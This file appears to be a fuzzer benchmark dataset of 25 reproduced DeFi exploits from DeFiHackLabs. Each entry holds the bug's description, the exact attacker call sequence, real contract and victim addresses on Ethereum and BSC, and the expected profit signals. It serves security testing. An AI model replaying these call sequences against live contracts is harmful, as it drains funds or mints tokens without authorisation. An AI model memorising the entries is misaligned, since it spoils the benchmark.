@@ -1,0 +1,1356 @@
+{
+  "dataset": "defihacklabs",
+  "kind": "fork",
+  "schema": "enrich",
+  "source_repo": "https://github.com/SunWeb3Sec/DeFiHackLabs",
+  "description": "Runnable DeFiHackLabs subset (skip=false): fuzzer-triggerable, fork setup in extend.",
+  "generated_by": "utils/restructure_datasets.py (+ validators via _dataset_io)",
+  "total_contracts": 25,
+  "meta": {
+    "chains": {
+      "mainnet": 15,
+      "bsc": 10
+    }
+  },
+  "contracts": [
+    {
+      "id": "defihacklabs/2022-10_Templedao",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "reentrancy_probe",
+        "description": "migrateStake(oldStaking=attacker_contract, amount) trusts the attacker-supplied oldStaking and invokes its migrateWithdraw callback (no-op via the harness attacker's fallback); withdrawAll then credits the full LP balance — unauthenticated migration.",
+        "calls": [
+          [
+            "migrateStake",
+            [
+              "attacker_address",
+              321154865567124596801893
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "withdrawAll",
+            [
+              false
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "reproduced": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "defihacklabs/2024-09_PLN",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "state_manipulation",
+        "description": "PLNTOKEN.transferFrom has a side effect that mints/credits the caller; buy PLN with WETH on the UniV2 router, trip transferFrom, sell the inflated PLN balance back to WETH, withdraw to ETH — net attacker ETH profit.",
+        "calls": [
+          [
+            "WETH.deposit",
+            [],
+            "0xc7d713b49da0000",
+            "attacker_address"
+          ],
+          [
+            "WETH.approve",
+            [
+              "ROUTER",
+              "max"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "approve",
+            [
+              "ROUTER",
+              "max"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "WETH.balanceOf",
+            [
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens",
+            [
+              "$ret3",
+              0,
+              [
+                "WETH",
+                "target_address"
+              ],
+              "attacker_address",
+              "now"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "transferFrom",
+            [
+              "holder",
+              "0x000000000000000000000000000000000000dEaD",
+              0
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "balanceOf",
+            [
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens",
+            [
+              "$ret6",
+              0,
+              [
+                "target_address",
+                "WETH"
+              ],
+              "attacker_address",
+              "now"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "WETH.balanceOf",
+            [
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "WETH.withdraw",
+            [
+              "$ret8"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained",
+          "attacker_profit"
+        ],
+        "reproduced": true
+      },
+      "extend": {
+        "external": [
+          {
+            "var": "WETH",
+            "interface": "IWETH",
+            "address": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+            "abi": [
+              {
+                "type": "function",
+                "name": "deposit",
+                "inputs": [],
+                "outputs": [],
+                "stateMutability": "payable"
+              },
+              {
+                "type": "function",
+                "name": "approve",
+                "inputs": [
+                  {
+                    "name": "spender",
+                    "type": "address"
+                  },
+                  {
+                    "name": "amount",
+                    "type": "uint256"
+                  }
+                ],
+                "outputs": [
+                  {
+                    "name": "",
+                    "type": "bool"
+                  }
+                ],
+                "stateMutability": "nonpayable"
+              },
+              {
+                "type": "function",
+                "name": "balanceOf",
+                "inputs": [
+                  {
+                    "name": "account",
+                    "type": "address"
+                  }
+                ],
+                "outputs": [
+                  {
+                    "name": "",
+                    "type": "uint256"
+                  }
+                ],
+                "stateMutability": "view"
+              },
+              {
+                "type": "function",
+                "name": "withdraw",
+                "inputs": [
+                  {
+                    "name": "wad",
+                    "type": "uint256"
+                  }
+                ],
+                "outputs": [],
+                "stateMutability": "nonpayable"
+              }
+            ]
+          },
+          {
+            "var": "ROUTER",
+            "interface": "IROUTER",
+            "address": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
+            "abi": [
+              {
+                "type": "function",
+                "name": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
+                "inputs": [
+                  {
+                    "name": "amountIn",
+                    "type": "uint256"
+                  },
+                  {
+                    "name": "amountOutMin",
+                    "type": "uint256"
+                  },
+                  {
+                    "name": "path",
+                    "type": "address[]"
+                  },
+                  {
+                    "name": "to",
+                    "type": "address"
+                  },
+                  {
+                    "name": "deadline",
+                    "type": "uint256"
+                  }
+                ],
+                "outputs": [],
+                "stateMutability": "nonpayable"
+              }
+            ]
+          },
+          {
+            "var": "holder",
+            "address": "0x3f5a63B89773986Fd436a65884fcD321DE77B832"
+          }
+        ]
+      }
+    },
+    {
+      "id": "defihacklabs/2022-10_BEGO",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "mint() signature check bypassed with empty r/s/v arrays — mint BEGO to attacker",
+        "calls": [
+          [
+            "mint",
+            [
+              "0xc9f2c9cd04674edea40000000",
+              "t",
+              "attacker_address",
+              [],
+              [],
+              []
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained",
+          "attacker_profit"
+        ],
+        "reproduced": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "defihacklabs/2023-05_FAPEN",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "unstake() bad balance check lets a non-staker withdraw the contract's own FAPEN",
+        "calls": [
+          [
+            "unstake",
+            [
+              "0x21d4339dc07f4d"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained",
+          "attacker_profit",
+          "target_drained",
+          "target_loss"
+        ],
+        "reproduced": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "defihacklabs/2024-09_WXETA",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "unprotected initialize() unlocks mint(); mint WXETA to the attacker",
+        "calls": [
+          [
+            "initialize",
+            [
+              "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "mint",
+            [
+              "attacker_address",
+              "0xd3c21bcecceda1000000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained"
+        ],
+        "reproduced": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "defihacklabs/2022-10_Uerii",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "public mint() has no access control — mints UERII straight to the caller",
+        "calls": [
+          [
+            "mint",
+            [],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained"
+        ],
+        "reproduced": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "defihacklabs/2022-03_Umbrella",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "overflow_probe",
+        "description": "StakingRewards.withdraw() underflows _balances for a non-staker, transferring out the pool's staking (UniLP) tokens",
+        "calls": [
+          [
+            "withdraw",
+            [
+              "8792873290680252648282"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "reproduced": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "defihacklabs/2022-03_CompoundTusd",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "sweepToken() fails to block the cToken's own underlying when reached via TUSD's legacy address alias, draining the market's TUSD",
+        "calls": [
+          [
+            "sweepToken",
+            [
+              "tusd"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "target_drained"
+        ],
+        "reproduced": true
+      },
+      "extend": {
+        "external": [
+          {
+            "var": "tusd",
+            "address": "0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E"
+          }
+        ]
+      }
+    },
+    {
+      "id": "defihacklabs/2023-05_Melo",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "public mint() with no access control lets anyone mint MEL to themselves (supply inflation)",
+        "calls": [
+          [
+            "mint",
+            [
+              "attacker_address",
+              "0xd3c21bcecceda1000000",
+              ""
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained"
+        ],
+        "reproduced": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "defihacklabs/2022-04_cftoken",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "public _transfer() lets anyone move CFToken out of the liquidity pair to themselves",
+        "calls": [
+          [
+            "_transfer",
+            [
+              "pair",
+              "attacker_address",
+              "0x3635c9adc5dea00000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained"
+        ],
+        "reproduced": true
+      },
+      "extend": {
+        "external": [
+          {
+            "var": "pair",
+            "address": "0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b"
+          }
+        ]
+      }
+    },
+    {
+      "id": "defihacklabs/2018-04_BEC",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "overflow_probe",
+        "description": "batchTransfer integer overflow: receivers*_value wraps to 0 so the SafeMath sender-balance check passes with a zero balance, minting 2^255 BEC to each (distinct) recipient",
+        "calls": [
+          [
+            "batchTransfer",
+            [
+              [
+                "attacker_address",
+                "0x000000000000000000000000000000000000dEaD"
+              ],
+              "0x8000000000000000000000000000000000000000000000000000000000000000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained"
+        ],
+        "reproduced": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "defihacklabs/2020-06_Bancor",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "public safeTransferFrom on the Bancor contract lets anyone move any token a victim approved to it; drains the victim's XBP allowance to the attacker",
+        "calls": [
+          [
+            "XBP.balanceOf",
+            [
+              "victim"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "safeTransferFrom",
+            [
+              "XBP",
+              "victim",
+              "attacker_address",
+              "$ret0"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained"
+        ],
+        "reproduced": true
+      },
+      "extend": {
+        "external": [
+          {
+            "var": "XBP",
+            "interface": "IERC20",
+            "address": "0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40",
+            "abi": [
+              {
+                "type": "function",
+                "name": "balanceOf",
+                "inputs": [
+                  {
+                    "type": "address",
+                    "name": ""
+                  }
+                ],
+                "outputs": [
+                  {
+                    "type": "uint256",
+                    "name": ""
+                  }
+                ],
+                "stateMutability": "view"
+              }
+            ]
+          },
+          {
+            "var": "victim",
+            "address": "0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E"
+          }
+        ]
+      }
+    },
+    {
+      "id": "defihacklabs/2024-02_SwarmMarkets",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "public xToken.mint() with no access control lets anyone mint XToken to themselves (supply inflation); the wrapper.unwrap that realizes DAI/USDC is the droppable cash-out",
+        "calls": [
+          [
+            "mint",
+            [
+              "attacker_address",
+              "0xd3c21bcecceda1000000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained"
+        ],
+        "reproduced": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "defihacklabs/2022-07_FlippazOne",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "ownerWithdrawAllTo has no access control; any caller drains all of the contract's ETH to an arbitrary address",
+        "calls": [
+          [
+            "ownerWithdrawAllTo",
+            [
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "reproduced": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "defihacklabs/2024-05_MetaDragon",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "state_manipulation",
+        "description": "ERC404 transfer to the token/erc721 address triggers transform()/mint; repeated self-directed transfers mint MetaDragon tokens to the caller from nothing",
+        "calls": [
+          [
+            "transfer",
+            [
+              "target_address",
+              "0"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "transfer",
+            [
+              "target_address",
+              "1"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "transfer",
+            [
+              "target_address",
+              "2"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "transfer",
+            [
+              "target_address",
+              "3"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "transfer",
+            [
+              "target_address",
+              "4"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "transfer",
+            [
+              "target_address",
+              "5"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "transfer",
+            [
+              "target_address",
+              "6"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "transfer",
+            [
+              "target_address",
+              "7"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "transfer",
+            [
+              "target_address",
+              "8"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "transfer",
+            [
+              "target_address",
+              "9"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "transfer",
+            [
+              "target_address",
+              "10"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "transfer",
+            [
+              "target_address",
+              "11"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained"
+        ],
+        "reproduced": true
+      },
+      "extend": {
+        "external": []
+      }
+    },
+    {
+      "id": "defihacklabs/2025-01_98Token",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "unprotected swapTokensForTokens drains the helper contract's own 98-token balance, swaps it to USDT and sends the proceeds to an arbitrary recipient",
+        "calls": [
+          [
+            "swapTokensForTokens",
+            [
+              [
+                "token98",
+                "USDT"
+              ],
+              "97555900794950304298569411189",
+              "0",
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "reproduced": true
+      },
+      "extend": {
+        "external": [
+          {
+            "var": "token98",
+            "address": "0xc0dDfD66420ccd3a337A17dD5D94eb54ab87523F"
+          },
+          {
+            "var": "USDT",
+            "address": "0x55d398326f99059fF775485246999027B3197955"
+          }
+        ]
+      }
+    },
+    {
+      "id": "defihacklabs/2024-11_Ak1111",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "nonblockingLzReceive1(...) has no access control and mints AK1111 to the caller for free (supply inflation); the trailing PancakeSwap cash-out is the droppable terminal swap.",
+        "calls": [
+          [
+            "nonblockingLzReceive1",
+            [
+              0,
+              "attacker_address",
+              62802553600771229825598,
+              "0x"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained"
+        ],
+        "reproduced": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "defihacklabs/2024-08_YodlRouter",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "transferFee(amount,feeBps,token,from,to) has no access control; one call pulls a victim's USDC (approved to the router) to the attacker.",
+        "calls": [
+          [
+            "transferFee",
+            [
+              45588747326,
+              10000,
+              "USDC",
+              "victim",
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained"
+        ],
+        "reproduced": true
+      },
+      "extend": {
+        "external": [
+          {
+            "var": "USDC",
+            "address": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
+          },
+          {
+            "var": "victim",
+            "address": "0x5322BFF39339eDa261Bf878Fa7d92791Cc969Bb0"
+          }
+        ]
+      }
+    },
+    {
+      "id": "defihacklabs/2024-12_Pledge",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "swapTokenU(amount,target) has no access control and sends the contract's BUSD to an arbitrary target.",
+        "calls": [
+          [
+            "swapTokenU",
+            [
+              989644233342705000000000000,
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "reproduced": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "defihacklabs/2022-06_Snood",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "a broken-allowance transferFrom lets the attacker pull the LP pair's SNOOD directly to themselves (attacker is credited the drained token); the trailing pair sync/swap cash-out is droppable.",
+        "calls": [
+          [
+            "balanceOf",
+            [
+              "pair"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "transferFrom",
+            [
+              "pair",
+              "attacker_address",
+              "$ret0"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained"
+        ],
+        "reproduced": true
+      },
+      "extend": {
+        "external": [
+          {
+            "var": "pair",
+            "address": "0x0F6b0960d2569f505126341085ED7f0342b67DAe"
+          }
+        ]
+      }
+    },
+    {
+      "id": "defihacklabs/2024-02_PANDORA",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "overflow_probe",
+        "description": "ERC404 transferFrom has a broken allowance check: under solc 0.7.6 (no overflow guard) `allowance[from][msg.sender] -= amount` underflows when the caller has no allowance, so a fresh attacker can move any holder's PANDORA. Steal tokens directly from the WETH/PANDORA V2 pair to the attacker (a small amount keeps ERC404 NFT mint/burn cheap) — attacker gains the target token.",
+        "calls": [
+          [
+            "transferFrom",
+            [
+              "holder",
+              "attacker_address",
+              "1100000000000000000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained"
+        ],
+        "reproduced": true
+      },
+      "extend": {
+        "external": [
+          {
+            "var": "holder",
+            "address": "0x89CB997C36776D910Cfba8948Ce38613636CBc3c"
+          }
+        ]
+      }
+    },
+    {
+      "id": "defihacklabs/2024-04_NGFS",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "delegateCallReserves() is unprotected and sets _uniswapV2Proxy=msg.sender; the attacker then calls setProxySync(self) (now passes the proxy check) to become _uniswapV2Library, then reserveMultiSync(self, amount) which does _balances[self] += amount (SafeMath .air = addition) — an unconditional mint of NGFS to the attacker (money from nowhere). Attacker gains the target token directly; the real PoC's router swap to USDT is only the cash-out.",
+        "calls": [
+          [
+            "delegateCallReserves",
+            [],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "setProxySync",
+            [
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "reserveMultiSync",
+            [
+              "attacker_address",
+              "0xd3c21bcecceda1000000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained",
+          "attacker_profit"
+        ],
+        "reproduced": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "defihacklabs/2022-10_EFLeverVault",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "flash_loan_probe",
+        "description": "EFLeverVault prices its ef_token shares from getVirtualPrice()=getVolume()/totalSupply, where getVolume reads the vault's live Aave collateral-minus-debt. A Balancer flashLoan whose RECEIVER is the vault itself (no attacker callback) routes into the vault's receiveFlashLoan->_withdraw, leaving the Aave position inflated relative to ef_token supply. So: deposit 0.1 ETH (mint shares cheap) -> trigger BALANCER_VAULT.flashLoan(vault,[WETH],[1000e18],\"0x2\") -> withdraw 0.09 shares at the inflated virtual price -> net attacker ETH. Self-funded (0.1 ETH), flash capital is Balancer's and repaid in-call; profit realized in native ETH.",
+        "calls": [
+          [
+            "deposit",
+            [
+              "0x16345785d8a0000"
+            ],
+            "0x16345785d8a0000",
+            "attacker_address"
+          ],
+          [
+            "BALANCER_VAULT.flashLoan",
+            [
+              "target_address",
+              [
+                "WETH"
+              ],
+              [
+                "0x3635c9adc5dea00000"
+              ],
+              "0x307832"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "withdraw",
+            [
+              "0x13fbe85edc90000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained",
+          "attacker_profit",
+          "target_drained"
+        ],
+        "reproduced": true
+      },
+      "extend": {
+        "external": [
+          {
+            "var": "BALANCER_VAULT",
+            "interface": "IBalancerVault",
+            "address": "0xBA12222222228d8Ba445958a75a0704d566BF2C8",
+            "abi": [
+              {
+                "type": "function",
+                "name": "flashLoan",
+                "inputs": [
+                  {
+                    "name": "recipient",
+                    "type": "address"
+                  },
+                  {
+                    "name": "tokens",
+                    "type": "address[]"
+                  },
+                  {
+                    "name": "amounts",
+                    "type": "uint256[]"
+                  },
+                  {
+                    "name": "userData",
+                    "type": "bytes"
+                  }
+                ],
+                "outputs": [],
+                "stateMutability": "nonpayable"
+              }
+            ]
+          },
+          {
+            "var": "WETH",
+            "address": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
+          }
+        ]
+      }
+    },
+    {
+      "id": "defihacklabs/2022-02_TecraSpace",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "access_control_probe",
+        "description": "TcrToken.burnFrom has REVERSED allowance indexing: it checks _allowances[msg.sender][from] instead of [from][msg.sender], so the attacker self-approves the pool (approve(pool,max)) and then burnFrom(pool, almost-all) burns the WETH/USDT/TCR pool's own TCR. Buy TCR with own ETH on the UniV2 router, burn the pool's TCR to spike TCR's price, POOL.sync(), sell the bought TCR back to USDT at the inflated price -> net attacker USDT. Self-funded (9 ETH), no flash/callback.",
+        "calls": [
+          [
+            "approve",
+            [
+              "POOL",
+              "max"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "approve",
+            [
+              "ROUTE",
+              "max"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "ROUTE.swapExactETHForTokens",
+            [
+              1,
+              [
+                "WETH",
+                "USDT",
+                "target_address"
+              ],
+              "attacker_address",
+              "now"
+            ],
+            "0x7ce66c50e2840000",
+            "attacker_address"
+          ],
+          [
+            "burnFrom",
+            [
+              "POOL",
+              "58027183904946"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "POOL.sync",
+            [],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "balanceOf",
+            [
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "ROUTE.swapExactTokensForTokens",
+            [
+              "$ret5",
+              1,
+              [
+                "target_address",
+                "USDT"
+              ],
+              "attacker_address",
+              "now"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained"
+        ],
+        "reproduced": true
+      },
+      "extend": {
+        "external": [
+          {
+            "var": "ROUTE",
+            "interface": "IUniRoute",
+            "address": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
+            "abi": [
+              {
+                "type": "function",
+                "name": "swapExactETHForTokens",
+                "inputs": [
+                  {
+                    "name": "amountOutMin",
+                    "type": "uint256"
+                  },
+                  {
+                    "name": "path",
+                    "type": "address[]"
+                  },
+                  {
+                    "name": "to",
+                    "type": "address"
+                  },
+                  {
+                    "name": "deadline",
+                    "type": "uint256"
+                  }
+                ],
+                "outputs": [
+                  {
+                    "name": "",
+                    "type": "uint256[]"
+                  }
+                ],
+                "stateMutability": "payable"
+              },
+              {
+                "type": "function",
+                "name": "swapExactTokensForTokens",
+                "inputs": [
+                  {
+                    "name": "amountIn",
+                    "type": "uint256"
+                  },
+                  {
+                    "name": "amountOutMin",
+                    "type": "uint256"
+                  },
+                  {
+                    "name": "path",
+                    "type": "address[]"
+                  },
+                  {
+                    "name": "to",
+                    "type": "address"
+                  },
+                  {
+                    "name": "deadline",
+                    "type": "uint256"
+                  }
+                ],
+                "outputs": [
+                  {
+                    "name": "",
+                    "type": "uint256[]"
+                  }
+                ],
+                "stateMutability": "nonpayable"
+              }
+            ]
+          },
+          {
+            "var": "POOL",
+            "interface": "IPairSync",
+            "address": "0x420725A69E79EEffB000F98Ccd78a52369b6C5d4",
+            "abi": [
+              {
+                "type": "function",
+                "name": "sync",
+                "inputs": [],
+                "outputs": [],
+                "stateMutability": "nonpayable"
+              }
+            ]
+          },
+          {
+            "var": "WETH",
+            "address": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
+          },
+          {
+            "var": "USDT",
+            "address": "0xdAC17F958D2ee523a2206206994597C13D831ec7"
+          }
+        ]
+      }
+    },
+    {
+      "id": "defihacklabs/2023-04_Swapos",
+      "poc": {
+        "kind": "fuzzer_bug_signal",
+        "strategy": "state_manipulation",
+        "description": "SwaposV2Pair.swap has a broken constant-product check: balances are scaled by 10000 but the reserve product by 1000**2 (1e6), a 100x mismatch, so a swap can drain ~99% of a reserve for a trivial input. Wrap a little WETH (token1), send 10 wei to the pair, then swap out the pair's whole token0 (swpToken) to the attacker. Raw Pair.swap but the amount0Out is a fork-deterministic constant and data is empty (no callback), so no computed-amountOut $ret is needed.",
+        "calls": [
+          [
+            "WETH.deposit",
+            [],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "WETH.transfer",
+            [
+              "target_address",
+              "0xa"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "swap",
+            [
+              "0x1e3583b07dc7decb5b67",
+              "0x0",
+              "attacker_address",
+              "0x"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "reproduced": true
+      },
+      "extend": {
+        "external": [
+          {
+            "var": "WETH",
+            "interface": "IWETH",
+            "address": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+            "abi": [
+              {
+                "type": "function",
+                "name": "deposit",
+                "inputs": [],
+                "outputs": [],
+                "stateMutability": "payable"
+              },
+              {
+                "type": "function",
+                "name": "transfer",
+                "inputs": [
+                  {
+                    "name": "to",
+                    "type": "address"
+                  },
+                  {
+                    "name": "amount",
+                    "type": "uint256"
+                  }
+                ],
+                "outputs": [
+                  {
+                    "name": "",
+                    "type": "bool"
+                  }
+                ],
+                "stateMutability": "nonpayable"
+              },
+              {
+                "type": "function",
+                "name": "balanceOf",
+                "inputs": [
+                  {
+                    "name": "",
+                    "type": "address"
+                  }
+                ],
+                "outputs": [
+                  {
+                    "name": "",
+                    "type": "uint256"
+                  }
+                ],
+                "stateMutability": "view"
+              }
+            ]
+          }
+        ]
+      }
+    }
+  ]
+}
